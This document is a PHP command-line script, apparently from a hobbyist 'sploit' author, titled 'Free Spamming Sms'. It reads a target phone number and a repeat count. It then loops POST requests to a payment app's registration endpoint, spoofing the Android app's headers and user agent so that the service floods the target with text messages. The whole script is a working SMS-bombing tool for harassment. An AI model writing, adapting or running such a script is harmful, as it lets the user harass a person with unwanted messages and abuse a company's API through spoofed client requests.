<?php
$banner = "\e[36;1m                                                                                 

[#] Free Spamming Sms [#]                                     
Author : ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ                  
Team   : No Team                   
Github : https//github.com/TheSploit/\n\n\e[0;1m";     

sleep(3);
echo $banner;
sleep(2);
echo "Masukan no target : ";
$target = trim(fgets(STDIN));
sleep(2);
echo "Jumlah spam : ";
$jumlah = trim(fgets(STDIN));
sleep(2);
echo "\n\n";

for ($i=1; $i <= $jumlah; $i++) {
	
$data = array("phonenumber" => $target);
$post = json_encode($data);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://gmapi.yapulsa.com:443/api/v1/alphapay/user/add_new_username_only");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-IMEI: 0", "X-APP: Android 2.6.0", "source: Android 2.6.0", "Content-Type: application/json; charset=utf-8"));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_USERAGENT, "okhttp/3.4.1");

$gas = curl_exec($ch);
curl_close($ch);

if (preg_match("/HTTP\/1.1 200 OK/", $gas, $res)) {
	echo $i.". spamming succes by ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ\n";
	sleep(1);
	}else{
		echo $i.". spamming failed by ⊱XͭPͪLͤᗝIƬ༻₁₀₀ᵏ\n";
		sleep(1);
		}

}
